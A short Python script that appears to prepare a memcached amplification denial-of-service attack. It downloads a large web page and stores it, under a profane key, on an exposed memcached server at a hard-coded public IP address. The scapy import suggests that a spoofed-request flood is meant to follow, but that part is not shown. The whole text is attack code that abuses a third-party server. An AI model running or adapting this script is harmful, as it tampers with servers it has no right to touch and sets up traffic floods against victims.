import requests
import memcache
import re
 
from scapy.all import *
 
SERVER_LIST = [
        '103.27.60.190:11211',
]
 
payload = requests.get('http://www.24h.com.vn/').text
payload_key = 'fuckit'
if not payload:
    print 'Khong the import payload'
 
try:
    for server in SERVER_LIST:
        if ':' in server:
            server = server.split(':')[0]
            mc = memcache.Client([server],debug=False)
            mc.set(payload_key, payload)
except Exception:
    raise
